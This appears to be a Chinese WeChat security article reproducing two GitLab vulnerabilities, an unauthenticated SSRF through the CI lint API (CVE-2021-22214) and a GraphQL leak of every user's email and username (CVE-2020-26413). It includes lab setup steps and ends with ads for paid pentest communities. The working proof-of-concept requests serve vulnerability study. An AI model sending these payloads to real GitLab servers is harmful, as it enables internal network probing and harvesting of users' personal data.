<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HFug1khyfHmCujhc_Gm_yQ)

******文章来源｜MS08067 Web 安全知识星球******  

> 本文作者：**Taoing**（Web 安全攻防合伙人）

GitLab 是一个用于仓库管理系统的开源项目，使用 Git 作为代码管理工具，并在此基础上搭建起来的 Web 服务。

### 一、漏洞描述

GitLab 是美国 GitLab 公司的一款使用 Ruby on Rails 开发的、自托管的、Git（版本控制系统）项目仓库应用程序。该程序可用于查阅项目的文件内容、提交历史、Bug 列表等。

**CVE-2021-22214**

GitLab 存在前台未授权 SSRF 漏洞，未授权的攻击者也可以利用该漏洞执行 SSRF 攻击（CVE-2021-22214）。该漏洞源于对用户提供数据的验证不足，远程攻击者可通过发送特殊构造的 HTTP 请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8KPiaEDJ2ibbVRLV41XMjic2JkMbDicXTZYzuWQfkl9XNoibQ5Q3G6z42cy2UpTDaPTwhf7ePk7Jric8Hg/640?wx_fmt=png)

### 二、漏洞影响

```
app="GitLab"
```

影响版本：从 10.5 开始的所有版本

安全版本：官方当前最新的 13.12.2, 13.11.5 和 13.10.5

### 三、POC：

```
curl -s --show-error -H 'Content-Type: application/json' https://example.gitlab.com/api/v4/ci/lint --data '{ "include_merged_yaml": true, "content": "include:\n  remote: http://xx.xxx.xx.xx:port/api/v1/targets?test.yml"}'
```

### 四、漏洞复现：

#### 1、环境搭建

**搭建环境介绍：CentOS7.6**

1) 首先按官网提示先安装依赖，然后执行下面命令添加 yum 源，选择 gitlab-ce 社区版

```
curl -s https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bash
```

2) 更新本地 yum 缓存

```
sudo yum makecache
```

3) 获取更新源中可安装所有的 gitlab 版本

```
yum list gitlab-ce --showduplicates|sort -r
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8KPiaEDJ2ibbVRLV41XMjic2JZ0Rm11XYZznpmq1NtibW2e07Btn7Jvc0JI3gJicgrYDEWGLAoBtxJKcg/640?wx_fmt=png)

**使用 yum 安装指定版本，例如 13.12.1**

```
yum install gitlab-ce-13.12.1-ce.0.el7
```

使用命令`gitlab-ctl reconfigure`即可默认配置安装 gitlab。

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8KPiaEDJ2ibbVRLV41XMjic2JqavTIeQ0DWo2qaiaPN2huMsrELWmurGKWCAHRlsGDOAaMibb1Bj8n55A/640?wx_fmt=png)

**默认配置安装 gitlab：端口默认 80**

```
gitlab-ctl reconfigure
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8KPiaEDJ2ibbVRLV41XMjic2JF2oicxYQUyVuMwAxibWXVOGhD2KIQZj2pLibq5w0JdBoB2ciaiayz207Mvw/640?wx_fmt=png)

#### 2、漏洞复现

1)dnslog

```
curl -s --show-error -H 'Content-Type: application/json' http://47.243.37.71/api/v4/ci/lint --data '{ "include_merged_yaml": true, "content": "include:\n  remote: http://rkv4ov.dnslog.cn/api/v1/targets/?test.yml"}'
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8KPiaEDJ2ibbVRLV41XMjic2JtDCe8t0kwtahyXAddIcFM6MJM2iamUicscue5xnaULiaDWCQlUDibeSRxA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8KPiaEDJ2ibbVRLV41XMjic2JUgcYN2hZViaAibibvsoRfic39qR5M7iaxSW0OAujMSiby7uwicXP4f4vzgp6w/640?wx_fmt=png)

GitLab_Graphql 邮箱信息泄露漏洞 (CVE-2020-26413)
----------------------------------------

### 一、漏洞描述

GitLab 是美国 GitLab 公司的一款使用 Ruby on Rails 开发的、自托管的、Git（版本控制系统）项目仓库应用程序。该程序可用于查阅项目的文件内容、提交历史、Bug 列表等。

GitLab 中存在 Graphql 接口 输入构造的数据时会泄露用户邮箱和用户名

### 二、影响范围

GitLab 13.4 – 13.6.2

title="GitLab"

### 三、漏洞复现

访问 URL

`http://xxx.xxx.xxx.xxx/-//graphql-explorer`

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8KPiaEDJ2ibbVRLV41XMjic2JKIrEpS8JPwHWrR4YMqAic5RrHxBKmA0rZ2vndLqicMR2avicI6LZTgC8A/640?wx_fmt=png)

Gitlab 本身不允许获取账号邮箱信息，这里通过调用 Graphql 用户名查询造成了邮箱泄露漏洞查看完报告后发现漏洞利用需要有账号用户名，在不知道的情况下无法获取邮箱，在 Graphql 官网查看得知可以通过另一个构造的语句一次性返回所有的用户名和邮箱

发包调用了 /api/graphql 接口发送数据

完整数据包为:

```
POST //api/graphql HTTP/1.1
Host: 10.1.2.33:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json
Content-Length: 220

{"query":"{\nusers {\nedges {\n node {\n username\n email\n avatarUrl\n status {\n emoji\n message\n messageHtml\n }\n }\n }\n }\n }","variables":null,"operationName":null}
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8KPiaEDJ2ibbVRLV41XMjic2Ju91xe4er4fb4kWGr94n4VLlrYyhppLsMML6Bygae6gW8t1DH4XPYbA/640?wx_fmt=png)

**618 优惠活动还没有结束！**

**福利一：**  

购全部 6 个星球，享 6.18 **惊爆价：1699 元**（原价 2458 元）**（追加 10 名）**

  
更送 **3 本**作者签名书（**五选三**）  
《Web 安全攻防：渗透测试实战指南》（89 元）  
《内网安全攻防：渗透测试实战指南》（99 元）  

《Python 安全攻防：渗透测试实指南》（99 元）  

《Kali Linux2 渗透实践指南 (第 2 版)》（89 元）  
《Java 代码审计（入门篇）》           （118 元）

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaiczc9eExatO0iby25U9zm3tC0ickSAPd0qPEw4HMO5ianH8bECEhib87Zf1PRYqGaLsHEyw8kXWRQIerw/640?wx_fmt=jpeg)   ![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibLRXRCfRt6FHsibXGufWPkpoCLyflNVCwmvSHBgcVm4J2Ma6llsDc3IL4pm8gaha2RPg5E0HPhQ4g/640?wx_fmt=jpeg)  

 ![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibud1JNDxibA6pTY23tAicYe9OibdxtgQZkZuGqMXfVLTJsDQXezEoOTzLG2OxGYxzPlicuKibianR0NtJw/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWa9r9k14gKT1e1n4K2yic2FJb8xC3W8O62PEicMV7wQicR90ajQib5NYUCUO0ZwOZiaRqRVicZfEVaNIiaMcw/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWa9DYgLfoc1CfGcqwicHiaFN5ahDRO67jEiczLalJBv2Zn7EtoBnClC1nSpXdvZk0t1Kyd83Tc8cfSrKA/640?wx_fmt=jpeg)

**注意**：需要购买的同学请添加**徐哥**微信！

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaib1x5o95XhhaibkDuXNOBYqPibUe8qYbOMJUVcXBxJO7ImAt68S7icKb9Hr0CcWiaKKbjibqhgofiaQv5rQ/640?wx_fmt=png)

**福利二：**  

本次活动，**单个星球我们只对外发放 50 张优惠券，最高立减 90 元  
**

**（6.20 号新增 30 张 Web 星球优惠券）**

大部分星球价格 365 元，**618 惊爆价：299 元  
**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa84wVVZgaxDKLdTCnaKzvcUZFKfCxZZzMTZDDlI79KDEicLt9b1bDWBqzDrBPDGCfowRSQVH569uEg/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa84wVVZgaxDKLdTCnaKzvcUP1I0KELk8gcavjCC1iawZ9lUGNouC7rY3XS16sNh14pvnlZFapCMp8A/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa84wVVZgaxDKLdTCnaKzvcUqLKPd1mv5yW5wgJfKOpzp0PCmWq7OJaggKdjdBAWn2WylicKOcApDcw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa84wVVZgaxDKLdTCnaKzvcUUSdM8VDJHUWGdd4P6zOYKQmfld9cib52jweb6n25VXibvOO5JoswBQsg/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8KPiaEDJ2ibbVRLV41XMjic2J7TRdn7Hl8gpzkvVShBj1MNkGdeUiaWyvbQ3m7lUqicha10XElFpOv2Iw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa84wVVZgaxDKLdTCnaKzvcUZW1icOYqic3AGQNLfld4HBBbmNQaaicSvGOQy1D9JpUA8icoDiaicDmpeBYA/640?wx_fmt=png)

一件衬衫的价格，让你学会一门渗透技术，超级划算了：

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9NuGttQmVyIn3k5RXjSibtldrOHrRUO8bpPUtMnIsJicbduKicwZEOfQ7ibESnSEib9FEMIL64RaNkibFw/640?wx_fmt=png)加入须知：

*   加入星球后，下载知识星球 App，微信登陆即可进入；
    
*   在星球置顶帖，添加管理员微信，邀请进内部微信群；
    

**目前有 4000 多位同学在知识星球和我们一起学习进步，我们等着你入伙！**  

**想白嫖的同学可以看这里哦！**  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaib5jk9a8RcC0kBlDJPcXQxyl75VGLLmYpt4AfTCRopNRDJicOZxjYn5GN4rPbyNdynuvvk4pI4TkTQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247493153&idx=1&sn=8a8ea93c4e4fca00128fae9306b168c0&chksm=fc3c5f20cb4bd6365156ec490c95f88ba188d27c966e5478b7adabd2709f95f3723fd372d0e8&scene=21#wechat_redirect)

**扫描下方二维码加入星球学习**  

**加入后邀请你进入内部微信群，内部微信群永久有效！**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

**来和 4000 + 位同学一起加入星球学习吧！**

![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)